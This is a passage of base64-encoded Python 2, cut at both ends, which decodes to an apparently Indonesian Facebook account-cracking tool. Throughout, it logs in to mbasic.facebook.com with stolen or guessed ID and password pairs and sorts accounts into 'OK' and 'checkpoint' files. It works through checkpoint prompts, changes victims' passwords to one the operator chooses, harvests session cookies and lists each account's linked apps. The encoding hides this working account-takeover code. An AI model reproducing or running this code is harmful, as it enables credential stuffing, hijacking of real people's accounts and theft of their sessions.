rcG9pbnQiIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCk6DQogICAgICAgICAgICBmb3JtID0gcnVuLmZpbmQoImZvcm0iKQ0KICAgICAgICAgICAgdGl0bGU9cmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJ1bikpDQogICAgICAgICAgICBsaW5rMj1ydW4uZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQogICAgICAgICAgICBkdHNnID0gZm9ybS5maW5kKCJpbnB1dCIseyJuYW1lIjoiZmJfZHRzZyJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAganpzdCA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6Imphem9lc3QifSlbInZhbHVlIl0NCiAgICAgICAgICAgIG5oICAgPSBmb3JtLmZpbmQoImlucHV0Iix7Im5hbWUiOiJuaCJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAgZGF0YUQgPSB7ImZiX2R0c2ciOiBkdHNnLCJmYl9kdHNnIjogZHRzZywiamF6b2VzdCI6IGp6c3QsImphem9lc3QiOiBqenN0LCJjaGVja3BvaW50X2RhdGEiOiIiLCJzdWJtaXRbQ29udGludWVdIjoiTGFuanV0a2FuIiwibmgiOiBuaH0NCiAgICAgICAgICAgIHhueHggPSBwYXJzZXIoc2VzLnBvc3QobWIrZm9ybVsiYWN0aW9uIl0sIGRhdGE9ZGF0YUQpLnRleHQsICJodG1sLnBhcnNlciIpDQogICAgICAgICAgICBuZ2V3ID0gW3l5LnRleHQgZm9yIHl5IGluIHhueHguZmluZF9hbGwoIm9wdGlvbiIpXQ0KICAgICAgICAgICAgcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzICAnICUgKEssdWlkLHB3LGRheSxtb250aCx5ZWFyKQ0KICAgICAgICAgICAgZm9yIG9wdCBpbiByYW5nZShsZW4obmdldykpOiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHByaW50KCIgICAgICAlcyVzLiAlcyVzICIlKFAsc3RyKG9wdCsxKSxLLG5nZXdbb3B0XSkpDQogICAgICAgICAgICBpZiAiMCIgaW4gc3RyKGxlbihuZ2V3KSk6DQogICAgICAgICAgICAJaWYgIkxpaGF0IGRldGFpbCBsb2dpbiB5YW5nIGRpdGFtcGlsa2FuLiBJbmkgQW5kYT8iIGluIHRpdGxlOg0KICAgICAgICAgICAgCSAgICBjb2tpID0gKCI7Iikuam9pbihbICIlcz0lcyIgJSAoa2V5LCB2YWx1ZSkgZm9yIGtleSwgdmFsdWUgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpIF0pDQogICAgICAgICAgICAgICAgICAgIGlmICJ1YmFoIiBpbiBzZWxmLnViYWhfcGFzczoNCiAgICAgICAgICAgICAgICAgICAgCXNlbGYudWJhaF9wdyh1aWQscHcsc2VzLHJ1bixsaW5rMikNCiAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgCXByaW50KCJcciAgICAgICVz4oiaIGFrdW4gb25lIHRhYiwgc2lsYWhrYW4gYW5kYSBsb2dpbiAgICAiJShIKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oJ09LLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1aWQscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgIGVsaWYgIk1hc3Vra2FuIEtvZGUgTWFzdWsgdW50dWsgTWVsYW5qdXRrYW4iIGluIHJlLmZpbmRhbGwoIlw8dGl0bGU+KC4qPyk8XC90aXRsZT4iLHN0cihydW4pKToNCiAgICAgICAgICAgICAgICAJcHJpbnQoIlxyICAgICAgJXPDlyBha3VuIHRlcnBhc2FuZyBhdXRlbnRpZmlrYXNpIDIgZmFrdG9yICAgIiUoTSkpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAJcHJpbnQoIlxyICAgICAgJXMhIHRlcmtlbmEgc3BhbSwgbW9kZSBwZXNhd2F0a2FuIDIgZGV0aWsgICAiJShNKSkNCiAgICAgICAgICAgIHByaW50KCJcciVzIyVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0lcz4iJShQLE0sUCkpDQogICAgICAgIGVsaWYgImNfdXNlciIgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgCXByaW50ICdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlcyAgJyAlIChLLHVpZCxwdyxkYXksbW9udGgseWVhcikNCiAgICAgICAgCXByaW50KCJcciAgICAgICVz4oiaIGFrdW4gdGlkYWsgY2hlY2twb2ludCwgc2lsYWhrYW4gYW5kYSBsb2dpbiAgICIlKEgpKQ0KICAgICAgICAJcHJpbnQoIlxyJXMjJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSVzPiIlKFAsTSxQKSkNCiAgICAgICAgCW9wZW4oJ09LLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1aWQscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICBlbGlmICJsb2dpbl9lcnJvciIgaW4gc3RyKHJ1bik6DQogICAgICAgIAlwcmludCAnXHIgJXMqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXMgICcgJSAoSyx1aWQscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgIAlwcmludCgiXHIlcyMlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJXM+IiUoUCxNLFApKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzICAnICUgKEssdWlkLHB3LGRheSxtb250aCx5ZWFyKQ0KICAgICAgICAJcHJpbnQoIlxyJXMjJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSVzPiIlKFAsTSxQKSkNCiAgICBkZWYgY3IzY2soc2VsZix1aWQscHcpOg0KICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgbWIgPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIpDQogICAgICAgIHVhID0gKCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBBU1VTX1owMEFEIEJ1aWxkL0xSWDIxVikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IikNCiAgICAgICAgb3B0aW9uID0gW10NCiAgICAgICAgc2VzLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6ICJtYmFzaWMuZmFjZWJvb2suY29tIiwiY2FjaGUtY29udHJvbCI6ICJtYXgtYWdlPTAiLCJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCJvcmlnaW4iOiBtYiwiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsInVzZXItYWdlbnQiOiB1YSwiYWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLCJ4LXJlcXVlc3RlZC13aXRoIjogIm1hcmsudmlhLmdwIiwic2VjLWZldGNoLXNpdGUiOiAic2FtZS1vcmlnaW4iLCJzZWMtZmV0Y2gtbW9kZSI6ICJuYXZpZ2F0ZSIsInNlYy1mZXRjaC11c2VyIjogIj8xIiwic2VjLWZldGNoLWRlc3QiOiAiZG9jdW1lbnQiLCJyZWZlcmVyIjogbWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCJhY2NlcHQtZW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsImFjY2VwdC1sYW5ndWFnZSI6ICJpZC1JRCxpZDtxPTAuOSJ9KQ0KICAgICAgICBkYXRhID0ge30NCiAgICAgICAgZ2VkID0gcGFyc2VyKHNlcy5nZXQobWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCBoZWFkZXJzPXsidXNlci1hZ2VudCI6dWF9KS50ZXh0LCAiaHRtbC5wYXJzZXIiKQ0KICAgICAgICBmbSA9IGdlZC5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCiAgICAgICAgbGlzdCA9IFsibHNkIiwiamF6b2VzdCIsIm1fdHMiLCJsaSIsInRyeV9udW1iZXIiLCJ1bnJlY29nbml6ZWRfdHJpZXMiLCJsb2dpbiIsImJpX3hyd2giXQ0KICAgICAgICBmb3IgaSBpbiBmbS5maW5kX2FsbCgiaW5wdXQiKToNCiAgICAgICAgICAgIGlmIGkuZ2V0KCJuYW1lIikgaW4gbGlzdDoNCiAgICAgICAgICAgIAlkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKTppLmdldCgidmFsdWUiKX0pDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIGRhdGEudXBkYXRlKHsiZW1haWwiOnVpZCwicGFzcyI6cHd9KQ0KICAgICAgICBydW4gPSBwYXJzZXIoc2VzLnBvc3QobWIrZm0uZ2V0KCJhY3Rpb24iKSwgZGF0YT1kYXRhLCBhbGxvd19yZWRpcmVjdHM9VHJ1ZSkudGV4dCwgImh0bWwucGFyc2VyIikNCiAgICAgICAgdXJsUG9zdD1zZXMucG9zdChtYitmbS5nZXQoImFjdGlvbiIpLGRhdGE9ZGF0YSkNCiAgICAgICAgaWYgIlRlbXVrYW4gQWt1biBBbmRhIiBpbiByZS5maW5kYWxsKCJcPHRpdGxlPiguKj8pPFwvdGl0bGU+IixzdHIodXJsUG9zdC50ZXh0KSk6DQogICAgICAgIAlwcmludCgiXHIgICAgICAlcyEgbW9kZSBwZXNhd2F0a2FuIDIgZGV0aWsgICAiJShNKSkNCiAgICAgICAgaWYgImNoZWNrcG9pbnQiIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCk6DQogICAgICAgICAgICBmb3JtID0gcnVuLmZpbmQoImZvcm0iKQ0KICAgICAgICAgICAgdGl0bGU9cmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJ1bikpDQogICAgICAgICAgICBsaW5rMj1ydW4uZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQogICAgICAgICAgICBkdHNnID0gZm9ybS5maW5kKCJpbnB1dCIseyJuYW1lIjoiZmJfZHRzZyJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAganpzdCA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6Imphem9lc3QifSlbInZhbHVlIl0NCiAgICAgICAgICAgIG5oICAgPSBmb3JtLmZpbmQoImlucHV0Iix7Im5hbWUiOiJuaCJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAgZGF0YUQgPSB7ImZiX2R0c2ciOiBkdHNnLCJmYl9kdHNnIjogZHRzZywiamF6b2VzdCI6IGp6c3QsImphem9lc3QiOiBqenN0LCJjaGVja3BvaW50X2RhdGEiOiIiLCJzdWJtaXRbQ29udGludWVdIjoiTGFuanV0a2FuIiwibmgiOiBuaH0NCiAgICAgICAgICAgIHhueHggPSBwYXJzZXIoc2VzLnBvc3QobWIrZm9ybVsiYWN0aW9uIl0sIGRhdGE9ZGF0YUQpLnRleHQsICJodG1sLnBhcnNlciIpDQogICAgICAgICAgICBuZ2V3ID0gW3l5LnRleHQgZm9yIHl5IGluIHhueHguZmluZF9hbGwoIm9wdGlvbiIpXQ0KICAgICAgICAgICAgcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgICAgICBmb3Igb3B0IGluIHJhbmdlKGxlbihuZ2V3KSk6ICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHJpbnQoIiAgICAgICVzJXMuICVzJXMgIiUoUCxzdHIob3B0KzEpLEssbmdld1tvcHRdKSkNCiAgICAgICAgICAgIGlmICIwIiBpbiBzdHIobGVuKG5nZXcpKToNCiAgICAgICAgICAgIAlpZiAiTGloYXQgZGV0YWlsIGxvZ2luIHlhbmcgZGl0YW1waWxrYW4uIEluaSBBbmRhPyIgaW4gdGl0bGU6DQogICAgICAgICAgICAJICAgIGNva2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkNCiAgICAgICAgICAgICAgICAgICAgaWYgInViYWgiIGluIHNlbGYudWJhaF9wYXNzOg0KICAgICAgICAgICAgICAgICAgICAJc2VsZi51YmFoX3B3KHVpZCxwdyxzZXMscnVuLGxpbmsyKQ0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAJcHJpbnQoIlxyICAgICAgJXPiiJogYWt1biBvbmUgdGFiLCBzaWxhaGthbiBhbmRhIGxvZ2luICAgICIlKEgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIFxuIiUgKHVpZCxwdykpDQogICAgICAgICAgICAgICAgZWxpZiAiTWFzdWtrYW4gS29kZSBNYXN1ayB1bnR1ayBNZWxhbmp1dGthbiIgaW4gcmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJ1bikpOg0KICAgICAgICAgICAgICAgIAlwcmludCgiXHIgICAgICAlc8OXIGFrdW4gdGVycGFzYW5nIGF1dGVudGlmaWthc2kgMiBmYWt0b3IgICAiJShNKSkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIAlwcmludCgiXHIgICAgICAlcyEgdGVya2VuYSBzcGFtLCBtb2RlIHBlc2F3YXRrYW4gMiBkZXRpayAgICIlKE0pKQ0KICAgICAgICAgICAgcHJpbnQoIlxyJXMjJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSVzPiIlKFAsTSxQKSkNCiAgICAgICAgZWxpZiAiY191c2VyIiBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgIAlwcmludCgiXHIgICAgICAlc+KImiBha3VuIHRpZGFrIGNoZWNrcG9pbnQsIHNpbGFoa2FuIGFuZGEgbG9naW4gICAiJShIKSkNCiAgICAgICAgCXByaW50KCJcciVzIyVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0lcz4iJShQLE0sUCkpDQogICAgICAgIAlvcGVuKCdPSy8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXMgXG4iJSAodWlkLHB3KSkNCiAgICAgICAgZWxpZiAibG9naW5fZXJyb3IiIGluIHN0cihydW4pOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgIAlwcmludCgiXHIlcyMlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJXM+IiUoUCxNLFApKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgIAlwcmludCgiXHIlcyMlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJXM+IiUoUCxNLFApKQ0KICAgIGRlZiB1YmFoX3B3KHNlbGYsdWlkLHB3LHNlcyxydW4sbGluazIpOg0KICAgIAlkYXQsZGF0Mj17fSx7fQ0KICAgIAlidXQ9WyJzdWJtaXRbWWVzXSIsIm5oIiwiZmJfZHRzZyIsImphem9lc3QiLCJjaGVja3BvaW50X2RhdGEiXQ0KICAgICAgICBmb3IgeCBpbiBydW4oImlucHV0Iik6DQogICAgICAgIAlpZiB4LmdldCgibmFtZSIpIGluIGJ1dDoNCiAgICAgICAgCSAgICBkYXQudXBkYXRlKHt4LmdldCgibmFtZSIpOnguZ2V0KCJ2YWx1ZSIpfSkNCiAgICAgICAgdWJhaFB3PXNlcy5wb3N0KHNlbGYudXJsK2xpbmsyLmdldCgiYWN0aW9uIiksZGF0YT1kYXQpLnRleHQNCiAgICAgICAgcmVzVWJhaD1wYXJzZXIodWJhaFB3LCJodG1sLnBhcnNlciIpDQogICAgICAgIGxpbmszPXJlc1ViYWguZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQogICAgICAgIGJ1dDI9WyJzdWJtaXRbTmV4dF0iLCJuaCIsImZiX2R0c2ciLCJqYXpvZXN0Il0NCiAgICAgICAgaWYgIkJ1YXQgS2F0YSBTYW5kaSBCYXJ1IiBpbiByZS5maW5kYWxsKCJcPHRpdGxlPiguKj8pPFwvdGl0bGU+IixzdHIodWJhaFB3KSk6DQogICAgICAgIAlmb3IgYiBpbiByZXNVYmFoKCJpbnB1dCIpOg0KICAgICAgICAJICAgIGlmIGIuZ2V0KCJuYW1lIikgaW4gYnV0MjoNCiAgICAgICAgCSAgICAgICAgZGF0Mi51cGRhdGUoe2IuZ2V0KCJuYW1lIik6Yi5nZXQoInZhbHVlIil9KQ0KICAgICAgICAJZGF0Mi51cGRhdGUoeyJwYXNzd29yZF9uZXciOiIiLmpvaW4oc2VsZi5wd2JhcnUpfSkNCiAgICAgICAgCWFuPXNlcy5wb3N0KHNlbGYudXJsK2xpbmszLmdldCgiYWN0aW9uIiksZGF0YT1kYXQyKQ0KICAgICAgICAJY29raSA9ICgiOyIpLmpvaW4oWyAiJXM9JXMiICUgKGtleSwgdmFsdWUpIGZvciBrZXksIHZhbHVlIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKSBdKQ0KICAgICAgICAJcHJpbnQoIlxyJXMlcyBha3VuIG9uZSB0YWIsIHNhbmRpIGJlcmhhc2lsIGRpIHViYWggXG4gKi0tPiAlcyDil4ogJXMg4peKICVzCQkJIiUoSCx0aWwsdWlkLHNlbGYucHdiYXJ1WzBdLGNva2kpKQ0KICAgICAgICAJb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlc1xuIiAlICh1aWQsc2VsZi5wd2JhcnVbMF0sY29raSkpDQogICAgICAgIAlzZWxmLmFwbGlrYXNpKGNva2kpDQogICAgZGVmIGFwbGlrYXNpKHNlbGYsa3VraSk6DQogICAgICAgIHNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICBydW4gPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWFjdGl2ZSIpDQogICAgICAgIHJ1bl8gPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWluYWN0aXZlIikNCiAgICAgICAgb3R3ID0gc2VzLmdldChydW4sY29va2llcz17J2Nvb2tpZSc6a3VraX0pDQogICAgICAgIG90d18gPSBzZXMuZ2V0KHJ1bl8sY29va2llcz17J2Nvb2tpZSc6a3VraX0pDQogICAgICAgIGdlbSA9IHBhcnNlcihvdHcuY29udGVudCwnaHRtbC5wYXJzZXInKQ0KICAgICAgICBnZW1fID0gcGFyc2VyKG90d18uY29udGVudCwnaHRtbC5wYXJzZXInKQ0KICAgICAgICBhcGsgPSBnZW0uZmluZCgnZm9ybScsbWV0aG9kPSdwb3N0JykNCiAgICAgICAgYXBrXyA9IGdlbV8uZmluZCgnZm9ybScsbWV0aG9kPSdwb3N0JykNCiAgICAgICAgbm8gPSAwDQogICAgICAgIG5vXyA9IDANCiAgICAgICAgdHJ5Og0KICAgICAgICAJZm9yIGFwcCBpbiBhcGsuZmluZF9hbGwoImgzIik6DQogICAgICAgIAkgICAgZGF0YSA9IGFwcC5maW5kKCdzcGFuJykudGV4dA0KICAgICAgICAJICAgIG5vKz0xDQogICAgICAgIAkgICAgc2VsZi5nbS5hcHBlbmQoIiAgICAgICVzJXMuICVzJXMgIiUoUCxzdHIobm8pLEgsZGF0YSkpDQogICAgICAgIAlmb3IgYXBwXyBpbiBhcGtfLmZpbmRfYWxsKCJoMyIpOg0KICAgICAgICAJICAgIGRhdGFfID0gYXBwXy5maW5kKCdzcGFuJykudGV4dA0KICAgICAgICAJICAgIG5vXys9MQ0KICAgICAgICAJICAgIHNlbGYuZ20uYXBwZW5kKCIgICAgICAlcyVzLiAlcyVzICIlKFAsc3RyKG5vXyksTSxkYXRhXykpDQogICAgICAgIGV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjoNCiAgICAgICAgCXByaW50ICgiJXPigKIgZ2FnYWwgbWVuZGV0ZWtzaSIlKE0pKQ0KIyBDRUsgT1BTSSBVQkFIIFBXDQp1YmFoX3Bhc3MgPSBbXQ0KcHdiYXJ1ID0gW10NCnB3QmFydSA9IFtdDQp1cmwgPSAiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tIg0KZGVmIHViYWhwdygpOg0KCWphbGFuKCIlc+KAoiVzIE1vZGUgcGVzYXdhdGthbiB0ZXJsZWJpaCBkYWh1bHUgNSBkZXRpayAiJShVLE8pKQ0KCXB3PXJhd19pbnB1dCgiXG4lcyVzJXMgdWJhaCBzYW5kaSBwYWRhIGFrdW4gb25lIHRhYj8geS90ICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCglpZiBwdyBpblsnJ106DQoJCXByaW50KCIlc+KAoiBpc2kgeWcgYmVuYXIga2VudG9kICIlKE0pKQ0KCWVsaWYgcHcgaW5bJ3knLCdZJ106DQoJCXViYWhfcGFzcy5hcHBlbmQoInkiKQ0KCQlwdzI9cmF3X2lucHV0KCIlcyVzJXMgbWFzdWthbiBzYW5kaSAlcz4gJXMiJShVLHRpbCxPLE0sSykpDQoJCWlmIGxlbihwdzIpIDw9IDU6DQoJCQlleGl0KCIlc+KAoiBzYW5kaSBtaW5pbWFsIDYga2FyYWt0ZXIgIiUoTSkpDQoJCWVsc2U6DQoJCQlwd2JhcnUuYXBwZW5kKHB3MikNCgllbHNlOg0KCQlwYXNzDQpkZWYgZmlsZV9jcCgpOg0KICAgIGRpcnMgPSBvcy5saXN0ZGlyKCdDUCcpDQogICAgcHJpbnQgKCJcbiVz4oCiJXMgWyVzIHBpbGloIGhhc2lsIGNyYWNrIHlnIHRlcnNpbXBhbiB1bnR1ayBjZWsgb3BzaSAlc11cbiIlKFUsTyxVLE8pKQ0KICAgIGZvciBmaWxlIGluIGRpcnM6DQogICAgICAgIHByaW50KCIlc+KAoiVzPiAlcyVzIiUoVSxNLEssZmlsZSkpO2plZGEoMC4wNykNCiAgICB0cnk6DQogICAgCXByaW50KCJcbiVzJXMlcyBNYXN1a2FuIGZpbGUgWyBjdGglczogJXMlcy50eHQlcyBdIiUoVSx0aWwsTyxNLEssd2FrdHUsTykpDQogICAgICAgIG9wc2koKQ0KICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICBwcmludCAoJyVz4oCiIGZpbGUgdGlkYWsgYWRhJyUoTSkpO2V4aXQoKQ0KZGVmIG9wc2koKToNCglDUCA9ICgiQ1AvIikNCglyb21pID0gcmF3X2lucHV0KCIlcyVzJXMgTmFtYSBmaWxlICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCglpZiByb21pID09ICIiOg0KCQlwcmludCgiJXMlcyBpc2kgeWFuZyBiZW5hciAiJShNLHRpbCkpO2plZGEoMik7b3BzaSgpDQoJdHJ5Og0KCQlmaWxlX2NwID0gb3BlbihDUCtyb21pLCAiciIpLnJlYWRsaW5lcygpDQoJZXhjZXB0IElPRXJyb3I6DQoJCWV4aXQoIlxuJXMlcyBuYW1hIGZpbGUgJXMgdGlkYWsgdGVyc2VkaWEiJShNLHRpbCxyb21pKSkNCgl1YmFocHcoKQ0KCXByaW50KCJcbiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyIlKFAsTSxQKSk7amVkYSgyKQ0KCXByaW50ICgiJXMlcyVzIHRvdGFsIGFrdW4gJXM6ICVzJXMgIiUoVSx0aWwsTyxNLEssc3RyKGxlbihmaWxlX2NwKSkpKQ0KCXByaW50KCIgJXMjICVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAlcyMiJShQLE0sUCkpO2plZGEoMikNCglub21vciA9IDANCglmb3IgZmIgaW4gZmlsZV9jcDoNCgkJYWt1biA9IGZiLnJlcGxhY2UoIlxuIiwiIikNCgkJbmdlY2VrICA9IGFrdW4uc3BsaXQoIiDil4ogIikNCgkJbm9tb3IrPTENCgkJcHJpbnQoIlxuJXMlcy4lcyBsb2dpbiBha3VuICVzPiAlcyVzIiUoSCxzdHIobm9tb3IpLE8sTSxLLGFrdW4ucmVwbGFjZSgiICotLT4gIiwiIikpKTtqZWRhKDAuMDcpDQoJCXRyeToNCgkJCW1lbmdlY2VrKG5nZWNla1swXS5yZXBsYWNlKCIgKi0tPiAiLCIiKSwgbmdlY2VrWzFdKQ0KCQlleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQoJCQlwcmludCgiXHIlc+KAoiB0aWRhayBhZGEga29uZWtzaSAiJShNKSksc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMSkNCgkJCXBhc3MNCgkJZXhjZXB0Og0KCQkJcGFzcw0KCXByaW50KCJcbiVzJXMlcyBTZWxlc2FpIG1lbmdlY2VrIGFrdW4iJShVLHRpbCxPKSk7amVkYSgwLjA3KQ0KCXJhd19pbnB1dCgnJXMlcyVzIFslcyBFbnRlciVzIF0gJyUoVSx0aWwsTyxVLE8pKQ0KCW1lbnUoKQ0KZGF0YSA9IHt9DQpkYXRhMiA9IHt9DQpkZWYgbWVuZ2VjZWsodXNlcixwdyk6DQoJZ2xvYmFsIGxvb3AsdWJhaF9wYXNzLHB3YmFydQ0KCXNlc3Npb249cmVxdWVzdHMuU2Vzc2lvbigpDQoJc2Vzc2lvbi5oZWFkZXJzLnVwZGF0ZSh7DQoJCSJIb3N0IjoibWJhc2ljLmZhY2Vib29rLmNvbSIsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsDQoJCSJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIiwiYWNjZXB0LWxhbmd1YWdlIjoiaWQtSUQsaWQ7cT0wLjkiLCJyZWZlcmVyIjoiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLyIsDQoJCSJ1c2VyLWFnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCQU4vRU1BO0ZCTEMvaWRfSUQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIg0KCX0pDQoJc291cD1wYXJzZXIoc2Vzc2lvbi5nZXQodXJsKyIvbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04IikudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCWxpbms9c291cC5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCglmb3IgeCBpbiBzb3VwKCJpbnB1dCIpOg0KCQlkYXRhLnVwZGF0ZSh7eC5nZXQoIm5hbWUiKTp4LmdldCgidmFsdWUiKX0pDQoJZGF0YS51cGRhdGUoeyJlbWFpbCI6dXNlciwicGFzcyI6cHd9KQ0KCXVybFBvc3Q9c2Vzc2lvbi5wb3N0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iK2xpbmsuZ2V0KCJhY3Rpb24iKSxkYXRhPWRhdGEpDQoJcmVzcG9uc2U9cGFyc2VyKHVybFBvc3QudGV4dCwgImh0bWwucGFyc2